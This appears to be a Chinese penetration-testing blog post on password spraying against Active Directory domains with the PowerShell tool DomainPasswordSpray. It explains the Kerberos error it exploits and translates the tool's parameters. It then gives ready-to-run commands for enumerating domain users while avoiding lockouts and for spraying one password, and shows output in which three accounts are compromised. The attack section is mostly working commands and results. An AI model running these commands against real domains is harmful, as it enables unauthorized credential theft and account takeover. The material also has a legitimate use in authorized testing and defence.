---
title: "内网渗透-密码喷洒Password Spraying"
date: 2020-08-31 11:56:23 +0800
category: 内网渗透
tags: [内网,域]
excerpt: 内网渗透-密码喷洒Password Spraying
---
# Password Spraying
## 原理
+ 本质上，通过以下Kerberos错误代码来加以利用
|用户状态|Kerberos错误|
|----|----|
|密码错误|KDC_ERR_PREAUTH_FAILED|
# 利用

## DomainPasswordSpray
DomainPasswordSpray是用PowerShell编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用LDAP从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒
+ https://github.com/dafthack/DomainPasswordSpray

----
以下内容来自:https://payloads.online/archivers/2018-05-02/1

![0x00][0x00]

**GitHub项目地址：https://github.com/dafthack/DomainPasswordSpray**

由于作者的脚本有一个小瑕疵，故此我改了一下，避免抛出了一些错误。

![0x01][0x01]

**优化后的地址：http://payloads.online/scripts/Invoke-DomainPasswordSpray.txt**


## 0x02 参数说明

在代码的开头就已经有介绍了，我简单汉化一下。


描述：该模块主要用于从域中收集用户列表。

* 参数： `Domain` 指定要测试的域名
* 参数： `RemoveDisabled` 尝试从用户列表删除禁用的账户  
* 参数： `RemovePotentialLockouts` 删除锁定账户 
* 参数： `UserList` 自定义用户列表(字典)。 如果未指定，这将自动从域中获取
* 参数： `Password` 指定单个密码进行口令测试
* 参数： `PasswordList` 指定一个密码字典
* 参数： `OutFile` 将结果保存到某个文件
* 参数： `Force` 当枚举出第一个后继续枚举，不询问

## 0x03 使用说明

使用例子：

`C:\PS> Get-DomainUserList`

该命令将从域中收集用户列表。

`C:\PS> Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt`

该命令将收集域“域名”中的用户列表，包括任何未被禁用且未接近锁定状态的帐户。 它会将结果写入“userlist.txt”文件中

`C:\PS> Invoke-DomainPasswordSpray -Password Winter2016`

该命令将会从域环境中获取用户名，然后逐个以密码`Winter2016`进行认证枚举


`C:\PS> Invoke-DomainPasswordSpray -UserList users.txt -Domain 域名 -PasswordList passlist.txt -OutFile sprayed-creds.txt`

该命令将会从`users.txt`中提取用户名，与`passlist.txt`中的密码对照成一对口令，进行域认证枚举，登录成功的结果将会输出到`sprayed-creds.txt`

## 0x04 实战

### 获取域环境中的用户列表

**命令：**`C:\PS> Get-DomainUserList | Out-File -Encoding ascii userlist.txt`

**输出：**

```
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] There appears to be no lockout policy.
[*] There are 8 total users found.
[*] Created a userlist containing 8 users gathered from the current user's domain
```

获取的用户名：

```
C:\PS> type .\userlist.txt
Administrator
Guest
liyingzhe
krbtgt
Hack
testPass
webManager
dba
```

### 密码枚举

![0x02][0x02]

**命令：** `C:\PS> Invoke-DomainPasswordSpray -Domain 域名 -Password w!23456 -OutFile sprayed-creds.txt`

**输出：**

```
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] There appears to be no lockout policy.
[*] Removing disabled users from list.
[*] There are 6 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 6 users gathered from the current user's domain
[*] Password spraying has begun. Current time is 18:45
[*] This might take a while depending on the total number of users
1 of 6 users tested2 of 6 users tested3 of 6 users tested[*] SUCCESS! User:testPass Password:w!23456
4 of 6 users tested[*] SUCCESS! User:webManager Password:w!23456
5 of 6 users tested[*] SUCCESS! User:dba Password:w!23456
6 of 6 users tested[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to sprayed-creds.txt
```

枚举的结果：

```
C:\PS > type .\sprayed-creds.txt
testPass:w!23456
webManager:w!23456
dba:w!23456
```

[0x00]: https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x00.png
[0x01]: https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x01.png
[0x02]: https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x02.png